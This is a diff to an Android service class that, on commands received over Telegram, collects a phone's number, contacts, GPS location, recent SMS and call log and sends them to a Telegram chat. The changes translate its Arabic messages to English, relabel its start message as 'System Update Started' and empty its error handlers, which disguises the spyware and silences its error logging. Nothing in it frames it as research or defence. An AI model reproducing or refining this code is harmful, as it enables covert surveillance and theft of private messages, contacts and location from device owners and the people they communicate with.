@@ -6,7 +6,6 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
@@ -50,7 +49,7 @@ public class MainService extends Service {
         
         startForegroundService();
         
-        sendToTelegram("✅ الخدمة بدأت");
+        sendToTelegram("✅ System Update Started");
         
         timer = new Timer();
         timer.scheduleAtFixedRate(new TimerTask() {
@@ -101,14 +100,10 @@ public class MainService extends Service {
                         }
                     }
                     response.close();
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
+                } catch (Exception e) {}
             }
             @Override
-            public void onFailure(Call call, IOException e) {
-                e.printStackTrace();
-            }
+            public void onFailure(Call call, IOException e) {}
         });
     }
 
@@ -133,19 +128,19 @@ public class MainService extends Service {
                 getCallLog();
                 break;
             case "/test":
-                sendToTelegram("✅ الخدمة تعمل - " + new java.util.Date().toString());
+                sendToTelegram("✅ System is working - " + new java.util.Date().toString());
                 break;
         }
     }
 
     private void sendHelp() {
-        String help = "📋 **الأوامر:**\n\n" +
-                "/info - معلومات الجهاز\n" +
-                "/contacts - جهات الاتصال\n" +
-                "/location - الموقع\n" +
-                "/sms - الرسائل\n" +
-                "/calls - المكالمات\n" +
-                "/test - اختبار الخدمة";
+        String help = "📋 **Available Commands:**\n\n" +
+                "/info - Device info\n" +
+                "/contacts - Contacts list\n" +
+                "/location - GPS location\n" +
+                "/sms - Last 10 SMS\n" +
+                "/calls - Last 10 calls\n" +
+                "/test - Check service";
         sendToTelegram(help);
     }
 
@@ -161,9 +156,9 @@ public class MainService extends Service {
                 info.put("phone", tm.getLine1Number());
             }
             
-            sendToTelegram("📱 **معلومات الجهاز:**\n" + info.toString(2));
+            sendToTelegram("📱 Device Info:\n" + info.toString(2));
         } catch (Exception e) {
-            sendToTelegram("❌ خطأ: " + e.getMessage());
+            sendToTelegram("Error: " + e.getMessage());
         }
     }
 
@@ -171,14 +166,14 @@ public class MainService extends Service {
         new Thread(() -> {
             try {
                 if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("❌ لا توجد صلاحية لجهات الاتصال");
+                    sendToTelegram("❌ No contacts permission");
                     return;
                 }
                 
                 ContentResolver cr = getContentResolver();
                 Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                     null, null, null, null);
-                StringBuilder sb = new StringBuilder("📇 **جهات الاتصال:**\n\n");
+                StringBuilder sb = new StringBuilder("📇 Contacts:\n\n");
                 int count = 0;
                 while (cursor != null && cursor.moveToNext() && count < 50) {
                     String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
@@ -187,10 +182,10 @@ public class MainService extends Service {
                     count++;
                 }
                 if (cursor != null) cursor.close();
-                if (count == 0) sb.append("لا توجد جهات اتصال");
+                if (count == 0) sb.append("No contacts found");
                 sendToTelegram(sb.toString());
             } catch (Exception e) {
-                sendToTelegram("❌ خطأ: " + e.getMessage());
+                sendToTelegram("Error: " + e.getMessage());
             }
         }).start();
     }
@@ -198,7 +193,7 @@ public class MainService extends Service {
     private void getLocation() {
         try {
             if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                sendToTelegram("❌ لا توجد صلاحية للموقع");
+                sendToTelegram("❌ No location permission");
                 return;
             }
             
@@ -208,12 +203,12 @@ public class MainService extends Service {
             
             if (location != null) {
                 String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
-                sendToTelegram("📍 **الموقع:**\nالخط: " + location.getLatitude() + "\nالطول: " + location.getLongitude() + "\n" + map);
+                sendToTelegram("📍 Location:\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + "\n" + map);
             } else {
-                sendToTelegram("📍 **الموقع:** غير متوفر");
+                sendToTelegram("📍 Location not available");
             }
         } catch (Exception e) {
-            sendToTelegram("❌ خطأ: " + e.getMessage());
+            sendToTelegram("Error: " + e.getMessage());
         }
     }
 
@@ -221,23 +216,23 @@ public class MainService extends Service {
         new Thread(() -> {
             try {
                 if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("❌ لا توجد صلاحية للرسائل");
+                    sendToTelegram("❌ No SMS permission");
                     return;
                 }
                 
                 Cursor cursor = getContentResolver().query(
                     android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("📨 **آخر 10 رسائل:**\n\n");
+                StringBuilder sb = new StringBuilder("📨 Last 10 SMS:\n\n");
                 while (cursor != null && cursor.moveToNext()) {
                     String address = cursor.getString(cursor.getColumnIndex("address"));
                     String body = cursor.getString(cursor.getColumnIndex("body"));
                     sb.append(address).append(": ").append(body).append("\n---\n");
                 }
                 if (cursor != null) cursor.close();
-                if (sb.length() == 0) sb.append("لا توجد رسائل");
+                if (sb.length() == 0) sb.append("No SMS found");
                 sendToTelegram(sb.toString());
             } catch (Exception e) {
-                sendToTelegram("❌ خطأ: " + e.getMessage());
+                sendToTelegram("Error: " + e.getMessage());
             }
         }).start();
     }
@@ -246,25 +241,25 @@ public class MainService extends Service {
         new Thread(() -> {
             try {
                 if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-                    sendToTelegram("❌ لا توجد صلاحية لسجل المكالمات");
+                    sendToTelegram("❌ No call log permission");
                     return;
                 }
                 
                 Cursor cursor = getContentResolver().query(
                     android.net.Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
-                StringBuilder sb = new StringBuilder("📞 **آخر 10 مكالمات:**\n\n");
+                StringBuilder sb = new StringBuilder("📞 Last 10 Calls:\n\n");
                 while (cursor != null && cursor.moveToNext()) {
                     String number = cursor.getString(cursor.getColumnIndex("number"));
                     String type = cursor.getString(cursor.getColumnIndex("type"));
                     String duration = cursor.getString(cursor.getColumnIndex("duration"));
-                    String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
-                    sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("ث\n");
+                    String typeText = type.equals("1") ? "Incoming" : type.equals("2") ? "Outgoing" : "Missed";
+                    sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("s\n");
                 }
                 if (cursor != null) cursor.close();
-                if (sb.length() == 0) sb.append("لا توجد مكالمات");
+                if (sb.length() == 0) sb.append("No calls found");
                 sendToTelegram(sb.toString());
             } catch (Exception e) {
-                sendToTelegram("❌ خطأ: " + e.getMessage());
+                sendToTelegram("Error: " + e.getMessage());
             }
         }).start();
     }
@@ -284,18 +279,8 @@ public class MainService extends Service {
                 try { response.close(); } catch (Exception e) {}
             }
             @Override
-            public void onFailure(Call call, IOException e) {
-                e.printStackTrace();
-            }
+            public void onFailure(Call call, IOException e) {}
         });
-    }
-
-    private int getBatteryLevel() {
-        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-        Intent batteryStatus = registerReceiver(null, ifilter);
-        int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
-        int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
-        return (int)(level * 100 / (float)scale);
     }
 
     @Override
